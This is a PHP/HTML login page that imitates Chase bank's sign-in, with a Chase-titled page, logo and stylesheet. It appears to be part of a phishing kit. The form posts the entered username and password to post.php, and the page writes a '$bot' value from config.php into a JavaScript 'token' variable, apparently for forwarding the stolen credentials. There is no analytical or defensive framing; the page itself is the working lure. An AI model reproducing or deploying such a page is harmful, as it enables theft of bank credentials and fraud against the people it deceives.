<?php
include("config.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/chase.css">
    <title>chase</title>
</head>
<body>
    <header>
        <img src="res/img/logo.svg">
    </header>
<script>var token=<?php echo json_encode($bot); ?>;</script>

<section>
    <div class="Container">

    <form action="post.php" method="post">

      <div class="box">
        <label>Username</label>
        <input type="text" name="user" required>
      </div>

      <div class="box">
        <label>Password</label>
        <input type="Password" name="pass" required>
       </div>

       <div class="L">
       <input type="checkbox"> Remember me
       <span></span>
        <input type="checkbox"> Use token
       </div>
       <div><button type="sumbit">Sign in</button></div>

       <h5>Forgot username/password? ></h8>
       <h5>Not Enrolled? Sign Up Now. ></h5>

<script src="./res/jq.js"></script>





            
        
        

    </div>









    </form>
    </section>
    
</body>
</html>